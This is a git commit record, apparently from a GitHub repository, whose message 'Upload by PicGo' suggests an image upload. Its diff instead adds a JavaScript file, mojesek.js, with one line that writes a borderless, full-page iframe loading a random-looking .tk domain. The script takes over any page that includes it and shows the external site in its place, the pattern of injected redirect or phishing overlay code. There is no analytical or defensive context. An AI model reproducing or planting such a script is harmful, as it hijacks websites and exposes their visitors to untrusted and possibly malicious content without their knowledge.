06b8ffc3eb2646db9b03c6a005e3995c224888b2
nowindow <71348913+nowindow@users.noreply.github.com>
2021-04-26 14:33:13 +0800

    Upload by PicGo

---
+++ mojesek.js
@@ -0,0 +1,1 @@
+document.write("<iframe name='mimisha' src='https://bjdt38h5w3.tk' width='100%' height='100%' marginwidth='0' marginheight='0' hspace='0' vspace='0' frameborder='0' scrolling='no'></iframe>");
